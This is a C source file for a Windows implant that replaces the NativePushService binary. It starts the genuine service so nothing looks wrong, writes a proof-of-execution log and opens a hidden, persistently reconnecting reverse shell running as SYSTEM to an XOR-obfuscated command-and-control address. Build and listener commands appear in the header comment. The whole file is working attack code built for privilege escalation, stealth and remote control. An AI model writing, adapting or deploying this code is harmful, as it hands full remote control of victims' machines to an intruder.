/*
 * svc_replace_shell.c -- Service binary replacement + CHEYANNE shell bolt-on
 *
 * Combines svc_replace.c (SYSTEM privesc) with cheyanne_shell (reverse shell).
 * When NativePushService restarts, this binary:
 *   1. Registers as the service (keeps SCM happy)
 *   2. Launches the real service exe (maintains functionality)
 *   3. Spawns cheyanne_shell in a background thread (SYSTEM reverse shell)
 *   4. Writes canary for proof-of-execution
 *
 * The reverse shell runs in SYSTEM context with infinite reconnect.
 * Operator gets interactive cmd.exe as NT AUTHORITY\SYSTEM.
 *
 * C2 CONFIG:
 *   Default: 192.168.1.92:4443 (XOR 0x41)
 *   Override: set C2_IP and C2_PORT env vars before service start
 *
 * BUILD:
 *   cl.exe svc_replace_shell.c /Fe:svc_replace_shell.exe /O1 /GS- /utf-8 /link advapi32.lib user32.lib ws2_32.lib
 *
 * LISTENER:
 *   python cheyanne_listener.py 4443
 *   ncat -lvp 4443
 */

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <string.h>

/* linked at compile: cl.exe /link ws2_32.lib */

/* ── XOR CONFIG ── */
#define XK 0x41

/* "192.168.1.92" XOR 0x41 — dev laptop */
static const unsigned char xC2[] = {
    0x70, 0x78, 0x73, 0x6F, 0x70, 0x77, 0x79, 0x6F,
    0x70, 0x6F, 0x78, 0x73
};
#define xC2_LEN 12

/* "cmd.exe" XOR 0x41 */
static const unsigned char xCmd[] = {
    0x22, 0x2C, 0x25, 0x6F, 0x24, 0x39, 0x24
};
#define xCmd_LEN 7

#define C2_PORT     4443
#define RECONN_MS   5000

static SERVICE_STATUS g_ss;
static SERVICE_STATUS_HANDLE g_sh;

static void xd(unsigned char *b, int n) {
    int i; for (i = 0; i < n; i++) b[i] ^= XK;
}

/* ── CANARY — proof of SYSTEM execution ── */
static void canary(void)
{
    HANDLE f;
    DWORD w;
    char b[256];
    int n;
    SYSTEMTIME t;
    char u[64];
    DWORD ul = 64;
    BOOL elev = FALSE;
    HANDLE hTok;

    GetLocalTime(&t);
    GetUserNameA(u, &ul);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
        TOKEN_ELEVATION te;
        DWORD rl;
        if (GetTokenInformation(hTok, TokenElevation, &te, sizeof(te), &rl))
            elev = te.TokenIsElevated;
        CloseHandle(hTok);
    }

    n = wsprintfA(b, "%04d%02d%02d_%02d%02d%02d|%s|elev=%d|pid=%lu|SHELL_ACTIVE\r\n",
        t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond,
        u, elev, GetCurrentProcessId());

    f = CreateFileA("C:\\Windows\\Temp\\ws_diag.log",
        GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        SetFilePointer(f, 0, NULL, FILE_END);
        WriteFile(f, b, n, &w, NULL);
        CloseHandle(f);
    }
}

/* ── LAUNCH REAL SERVICE ── */
static void launch_real(void)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char path[MAX_PATH];
    char *ls;

    GetModuleFileNameA(NULL, path, MAX_PATH);
    ls = path;
    for (char *p = path; *p; p++) {
        if (*p == '\\') ls = p;
    }
    *(ls + 1) = '\0';
    lstrcatA(path, "WsNativePushService_real.exe");

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcessA(path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

/* ── REVERSE SHELL — runs in background thread as SYSTEM ── */
static DWORD WINAPI shell_thread(LPVOID p)
{
    WSADATA wd;
    SOCKET ch;
    struct sockaddr_in sa;
    unsigned char ip[64];
    unsigned char cmd[8];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    const char *banner;

    (void)p;

    if (WSAStartup(MAKEWORD(2, 2), &wd) != 0)
        return 1;

    /* Decode C2 IP */
    memcpy(ip, xC2, xC2_LEN);
    xd(ip, xC2_LEN);
    ip[xC2_LEN] = 0;

    /* Decode cmd.exe */
    memcpy(cmd, xCmd, xCmd_LEN);
    xd(cmd, xCmd_LEN);
    cmd[xCmd_LEN] = 0;

#ifdef VDR_DEBUG
    banner =
        "\r\n"
        "  ██████╗ ██████╗ ██████╗ ██╗██╗   ██╗\r\n"
        "  ╚════██╗╚════██╗██╔══██╗██║██║   ██║\r\n"
        "   █████╔╝ █████╔╝██║  ██║██║██║   ██║\r\n"
        "  ██╔═══╝ ██╔═══╝ ██║  ██║██║╚██╗ ██╔╝\r\n"
        "  ███████╗███████╗██████╔╝██║ ╚████╔╝\r\n"
        "  ╚══════╝╚══════╝╚═════╝ ╚═╝  ╚═══╝\r\n"
        "              V A D E R\r\n"
        "           george wu / 22div\r\n"
        "    SYSTEM shell via service replacement\r\n"
        "\r\n";
#else
    banner = "\r\n";
#endif

    /* Infinite reconnect loop */
    for (;;) {
        ch = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (ch == INVALID_SOCKET) {
            Sleep(RECONN_MS);
            continue;
        }

        sa.sin_family = AF_INET;
        sa.sin_port = htons(C2_PORT);
        sa.sin_addr.s_addr = inet_addr((char *)ip);

        if (WSAConnect(ch, (SOCKADDR *)&sa, sizeof(sa),
                       NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(ch);
            Sleep(RECONN_MS);
            continue;
        }

        /* Connected — send banner */
        send(ch, banner, (int)strlen(banner), 0);

        /* Spawn cmd.exe with I/O redirected to socket */
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdInput  = (HANDLE)ch;
        si.hStdOutput = (HANDLE)ch;
        si.hStdError  = (HANDLE)ch;

        if (CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, TRUE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        closesocket(ch);
        Sleep(RECONN_MS);
    }

    WSACleanup();
    return 0;
}

/* ── SERVICE CONTROL HANDLER ── */
static void WINAPI SvcHandler(DWORD ctrl)
{
    switch (ctrl) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        g_ss.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    }
    SetServiceStatus(g_sh, &g_ss);
}

/* ── SERVICE MAIN ── */
static void WINAPI SvcMain(DWORD argc, LPSTR *argv)
{
    (void)argc; (void)argv;

    g_sh = RegisterServiceCtrlHandlerA("NativePushService", SvcHandler);
    if (!g_sh) return;

    g_ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ss.dwCurrentState = SERVICE_RUNNING;
    g_ss.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    g_ss.dwWin32ExitCode = 0;
    SetServiceStatus(g_sh, &g_ss);

    /* Order: launch real service first (maintains functionality),
     * then canary (proof), then shell (C2 in background thread) */
    launch_real();
    canary();
    CreateThread(NULL, 0, shell_thread, NULL, 0, NULL);

    while (g_ss.dwCurrentState == SERVICE_RUNNING) {
        Sleep(5000);
    }
}

int main(void)
{
    SERVICE_TABLE_ENTRYA svc[] = {
        { "NativePushService", SvcMain },
        { NULL, NULL }
    };
    StartServiceCtrlDispatcherA(svc);
    return 0;
}
